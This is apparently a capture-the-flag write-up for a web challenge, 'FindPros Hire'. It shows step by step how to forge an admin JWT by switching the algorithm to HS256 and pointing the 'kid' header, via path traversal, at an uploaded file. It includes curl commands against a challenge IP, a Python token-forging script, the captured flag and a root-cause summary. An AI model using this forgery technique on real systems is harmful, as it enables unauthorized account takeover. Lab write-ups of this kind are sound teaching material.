# FindPros Hire :: 001 — Writeup

## Goal
Login as `admin` on the FindPros Hire portal.

## High-level overview
The application uses a JWT stored in the `session` cookie. The JWT header includes a `kid` (key id) which the server uses to locate a public key file for verification. The server does not restrict algorithms; if we set `alg` to `HS256`, it will treat the selected key file as an HMAC secret instead of an RSA public key. Because uploads are accessible and the `kid` is not sanitized, we can upload a file with known contents, point `kid` to that file (path traversal), and sign a forged admin token with `HS256`.

## Recon
The login page uses `/api/login` and `/api/register`, which returns a JWT in a `session` cookie.

```
POST /api/login
Set-Cookie: session=<jwt>
```

Decoding the JWT header from a normal login shows:

```
{"alg":"RS256","typ":"JWT","kid":"<some-id>.pub"}
```

This suggests the server uses `kid` to load a verification key from disk. If the key path is controllable, we can switch to `HS256` and use any file as the HMAC secret.

## Exploit: JWT alg confusion + `kid` path traversal
1) **Register and login** to get a valid session.
2) **Upload a file** with known contents to `/api/upload`.
3) **Forge a JWT** with:
   - `alg: HS256`
   - `kid: ../uploads/<uploaded-file>`
   - payload `{ "username": "admin" }`
4) **Use the forged JWT** as the `session` cookie to access `/dashboard` and read the flag.

## Step-by-step

### 1) Register and login
```
curl -sS -X POST http://64.225.49.249:30560/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","password":"testpass","email":"t@t.com"}'

curl -sS -i -X POST http://64.225.49.249:30560/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","password":"testpass"}'
```
Copy the `session` cookie from the login response.

### 2) Upload a known file
Create a docx with known contents and upload it:

```
printf 'secretkey123' > /tmp/secret.docx

curl -sS -X POST http://64.225.49.249:30560/api/upload \
  -H 'Cookie: session=<your_user_session>' \
  -F 'resumeFile=@/tmp/secret.docx'
```
The response includes a filename like:

```
{"filename":"fb2babb6f213e55220c08417851e0181.docx"}
```

### 3) Forge an admin JWT (HS256)
Use the uploaded file path as the `kid` and sign with `secretkey123`:

```
python3 - <<'PY'
import base64, json, hmac, hashlib
secret=b'secretkey123'
header={'alg':'HS256','typ':'JWT','kid':'../uploads/fb2babb6f213e55220c08417851e0181.docx'}
payload={'username':'admin'}

def b64e(data):
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

h=b64e(json.dumps(header,separators=(',',':')).encode())
p=b64e(json.dumps(payload,separators=(',',':')).encode())
msg=f'{h}.{p}'.encode()
sig=b64e(hmac.new(secret,msg,hashlib.sha256).digest())
print(f'{h}.{p}.{sig}')
PY
```
This prints the forged JWT.

### 4) Use the forged token
Request `/dashboard` with the forged token as the cookie:

```
curl -sS http://64.225.49.249:30560/dashboard \
  -H 'Cookie: session=<forged_jwt>'
```
The page now shows `Logged in as (admin)` and contains the flag.

## Flag
```
flag{c5e3cd7e-e503-4ad2-a39b-ada5c3c91f02}
```

## Root cause
- The server trusts `kid` and uses it as a file path without sanitization.
- The server accepts `alg: HS256`, allowing algorithm confusion.
- Uploads are accessible and can be used as a signing secret.
